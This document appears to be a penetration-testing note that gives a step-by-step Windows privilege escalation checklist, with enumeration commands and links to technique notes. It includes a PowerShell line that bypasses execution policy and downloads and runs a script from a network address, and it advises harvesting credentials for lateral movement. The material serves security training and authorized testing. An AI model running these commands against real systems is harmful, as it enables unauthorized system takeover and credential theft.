# Escalate My Privilege Windows

A repeatable methodology for escalating from a low-privileged Windows foothold to Administrator or `NT AUTHORITY\SYSTEM`. Privilege escalation on Windows is overwhelmingly an **enumeration** problem: land a shell, systematically inventory the host, and match what you find against a known set of vectors. This note is the checklist that ties the rest of the category together — work it top to bottom, and follow each linked note when a check comes back positive.

## Step 0 — Situational awareness

Know who you are and what you can already do before hunting for a vector:

```cmd
whoami /all
whoami /priv
whoami /groups
echo %USERNAME% & hostname
net user %USERNAME%
```

- `whoami /priv` is the single highest-value command — an enabled `SeImpersonatePrivilege`, `SeBackupPrivilege`, or `SeDebugPrivilege` is often an instant win. See [Token Privilege Abuse](Token-Privilege-Abuse/Token-Privilege-Abuse.md).
- Membership in **Administrators** but running unelevated → you only need a [UAC Bypass](UAC-Bypass/UAC-Bypass.md).

## Step 1 — Automated enumeration first

Run an automated scanner to triage, then verify findings by hand:

```cmd
winPEASx64.exe quiet
```

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/PowerUp.ps1'); Invoke-AllChecks"
```

See [Privilege Escalation Tools](Privilege-Escalation-Tools.md) for WinPEAS, PowerUp, SharpUp, Seatbelt, and Watson.

For a **dependency-free, in-repo** alternative that needs no external download or dropped binary, use [PowerShell Privilege Escalation Enumeration](PowerShell-Privilege-Escalation-Enumeration.md) — it automates every check in Step 3's table.

## Step 2 — System & patch level

```cmd
systeminfo
```

Feed `systeminfo` to Windows Exploit Suggester / Watson to flag missing patches → [Windows Kernel Exploits](Windows-Kernel-Exploits/Windows-Kernel-Exploits.md), [Windows Version and Configuration](Windows-Version-and-Configuration.md).

## Step 3 — Walk the vectors

| Check | Command / signal | Technique note |
|-------|------------------|----------------|
| Token privileges | `whoami /priv` shows `SeImpersonate`/`SeBackup`/`SeDebug` | [Token Privilege Abuse](Token-Privilege-Abuse/Token-Privilege-Abuse.md) · [Impersonation and Potato Attacks](Impersonation-and-Potato-Attacks/Impersonation-and-Potato-Attacks.md) |
| Running as a service acct | `NETWORK SERVICE`/`LOCAL SERVICE` with SeImpersonate | [PrintSpoofer](Impersonation-and-Potato-Attacks/PrintSpoofer.md) · [RoguePotato](Impersonation-and-Potato-Attacks/RoguePotato.md) · [God Potato](Impersonation-and-Potato-Attacks/God-Potato.md) |
| Service misconfigs | unquoted path, weak `binPath`/file perms | [Services Exploitation](Services-Exploitation/Services-Exploitation.md) |
| Registry autoruns / `AlwaysInstallElevated` | writable Run keys; both AIE reg values = 1 | [Registry Exploitation Techniques](Registry-Exploitation/Registry-Exploitation-Techniques.md) |
| Scheduled tasks | high-priv task calling a writable binary | [Privilege Escalation via Scheduled Tasks](Privilege-Escalation-via-Scheduled-Tasks.md) |
| Startup applications | writable startup folder / Run entries | [Privilege Escalation via Startup Applications](Privilege-Escalation-via-Startup-Applications.md) |
| Stored credentials | GPP `cpassword`, registry, unattend, config files | [Password Mining](Password-Mining/Password-Mining.md) · [Group Policy Preferences cpassword](Password-Mining/Group-Policy-Preferences-cpassword.md) |
| UAC (already admin) | integrity `Medium`, in Administrators | [UAC Bypass](UAC-Bypass/UAC-Bypass.md) |
| Missing patches | Watson / exploit-suggester hits | [Windows Kernel Exploits](Windows-Kernel-Exploits/Windows-Kernel-Exploits.md) |

## Step 4 — Escalate, verify, clean up

- Land the elevated shell, then confirm: `whoami` → `nt authority\system`.
- Note what you changed (services created, files dropped, reg keys) and revert it.
- Harvest further credentials from the SYSTEM context for lateral movement → [Password Mining](Password-Mining/Password-Mining.md), Mimikatz Usage and Execution.

> [!warning]
> **Authorized use only**
> Run these techniques only against systems you own or are explicitly authorized to test. Use lab placeholders (`10.10.14.7`, a VM you control) for all addresses and credentials.

## Related
- [Windows Privilege Escalation](README.md) — category MOC this checklist indexes
- [Privilege Escalation Tools](Privilege-Escalation-Tools.md) — the enumeration scripts referenced in Step 1
- [Token Privilege Abuse](Token-Privilege-Abuse/Token-Privilege-Abuse.md) — the first thing to check after landing a shell
- [Services Exploitation](Services-Exploitation/Services-Exploitation.md) — the richest vector family
- [Escalation via RunAs](Escalation-via-RunAs.md) — run commands as another user once you recover a password
